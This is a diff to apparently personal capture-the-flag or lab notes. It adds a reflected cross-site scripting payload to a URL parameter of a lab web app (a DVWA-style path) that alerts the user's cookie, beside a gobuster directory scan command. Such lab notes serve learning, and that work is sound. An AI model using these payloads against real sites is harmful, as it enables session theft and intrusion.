@@ -67,4 +67,8 @@ gobuster dir -u http://10.10.226.146/ -w /usr/share/wordlists/dirbuster/director
 <script>alert(1)</script>
 
 ```
-
+Add the payload in the URL
+```js
+// Exploiting a vulnerable URL parameter and alerting the users cookie
+http://10.10.226.56/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
+```
